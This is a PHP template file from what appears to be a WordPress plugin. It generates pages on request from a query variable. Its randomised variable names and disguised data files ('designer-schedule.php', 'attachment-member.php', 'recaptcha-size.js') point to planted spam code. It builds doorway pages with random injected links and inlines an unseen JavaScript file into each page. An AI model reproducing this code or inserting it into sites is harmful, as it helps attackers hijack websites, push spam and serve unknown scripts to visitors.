<?php
$wPjdZBGw = intval(get_query_var('vwggutd'));

if ($wPjdZBGw < 1 || $wPjdZBGw > 4882) return;
$gZ3zyi = file(plugin_dir_path(__FILE__).'designer-schedule.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$rPms9FrcTP = explode(';', $gZ3zyi[$wPjdZBGw]);
if (count($rPms9FrcTP) < 2) return;
$aCIiJ8 = $rPms9FrcTP[0];
$haqoOq8l  = $rPms9FrcTP[1];
$ophE3 = $rPms9FrcTP[2];
$qa34pl  = $rPms9FrcTP[3];
$jQys92z77 = $rPms9FrcTP[4];
set_query_var('rsfxmu', $aCIiJ8);

$j2Exn = '';
$vW9ILbn9 = plugin_dir_path(__FILE__).'attachment-member.php';
if (is_file($vW9ILbn9)) {
	$cB33pe = file($vW9ILbn9, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($cB33pe);
	shuffle($cB33pe);
	$jcympWxh = mt_rand(2, 5);
	if (count($cB33pe) > $jcympWxh) {
		for ($mtPvPget8Q = 0; $mtPvPget8Q < $jcympWxh; $mtPvPget8Q++) {
			$sn6AZ0Ue = array_shift($cB33pe);
			$j2Exn .= '<p><a href="'.$sn6AZ0Ue.'">'.$sn6AZ0Ue.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $aCIiJ8; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $haqoOq8l . "</p>\n";
				if (strlen($qa34pl) > 0) echo "<p>" . $qa34pl . "</p>\n";
				if (strlen($ophE3) > 0) echo "<p>" . $ophE3 . "</p>\n";
				if (strlen($jQys92z77) > 0) echo '<p><a href="#"><img src="'.$jQys92z77.'"></a>' . "</p>\n";
				echo $j2Exn;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$dz1UtV = plugin_dir_path(__FILE__) . 'recaptcha-size.js';
if (is_file($dz1UtV)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($dz1UtV);
	echo '</script>';
}
get_footer();
?>
